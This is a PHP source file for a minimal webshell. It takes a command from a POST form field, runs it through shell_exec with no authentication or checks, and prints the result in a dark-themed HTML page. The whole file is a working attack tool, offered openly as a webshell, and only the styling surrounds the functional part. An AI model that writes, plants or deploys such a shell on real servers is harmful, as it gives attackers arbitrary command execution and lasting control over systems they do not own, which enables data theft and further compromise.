<?php
// AUTHOR : MatrixTM26
// GITHUB : https://github.com/MarrixTM26

// basic form cmd input
// example of usage:
//     - input: whoami

if (isset($_POST["cmd"])) {
    $cmd = $_POST["cmd"];
    $output = shell_exec($cmd);
}
// simple html template to make output look beautifull and easy to read.
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>basic webshell with form input cmd</title>
	<style type="text/css" media="all">
		* {
			box-sizing: border-box;
			padding: 0;
			margin: 0;
		}
		
		body {
			margin: 0;
			padding: 0;
			position: relative;
			display: flex;
			flex-direction: column;
			justify-content: center;
			align-items: center;
			min-height: 100vh;
			overflow-x: hidden;
		}
		
		.container {
			background: #000000;
			background-size: cover;
			background-repeat: no-repeat;
			background-position: center;
			margin: 0;
			gap: 1rem;
			padding: 1rem;
			position: relative;
			display: flex;
			flex-direction: column;
			justify-content: left;
			align-items: left;
			min-height: 100vh;
			min-width: 100vw;
			max-width: 100vw;
			overflow-x: hidden;
		}
		
		.content {
			background: #1b1b1b;
			background-size: cover;
			background-repeat: no-repeat;
			background-position: center;
			margin: 1rem;
			padding: 1rem;
			position: relative;
			display: flex;
			flex-direction: column;
			justify-content: left;
			align-items: left;
			border: 1px solid #ffffff;
			border-radius: 10px;
		}
		
		h2 {
			font-family: "Helvetica";
			font-size: 1.5rem;
			color: #900000;
			text-align: left;
		}
		
		p {
			font-family: "Helvetica";
			font-size: 1rem;
			color: #ffffff;
			text-align: left;
		}
		
		.output {
			background: #000000;
			background-size: cover;
			background-repeat: no-repeat;
			background-position: center;
			margin: 0;
			gap: 1rem;
			padding: 1rem;
		}
		
		input {
			background: #1a1a1a;
			background-size: cover;
			background-repeat: no-repeat;
			background-position: center;
			padding: 0.5rem;
			margin: 0.5rem;
			width: 100%;
			color: #ffffff;
			border: 1px solid #ff0000;
			border-radius: 10px;
		}
	</style>
</head>
<body>
	<div class="container">
		<h2>simple webshell with inurl command</h2>
		<hr />
		<div class="content">
			<h2>cmd input &darr;</h2>
			<form method="POST" accept-charset="utf-8">
				<input type="text" name="cmd" value="" required />
				<input type="submit" value="ENTER" />
			</form>
			<?php if (!empty($cmd)): ?>
	        	<p class="output">
	            	<?php echo htmlspecialchars($cmd); ?>
	        	</p>
	    	<?php endif; ?>
	    </div>
		<hr />
		<div class="content">
			<h2>cmd output &darr;</h2>
			<?php if (!empty($output)): ?>
	        	<p class="output">
	            	<?php echo htmlspecialchars($output); ?>
	        	</p>
	    	<?php endif; ?>
    	</div>
	</div>
</body>
</html>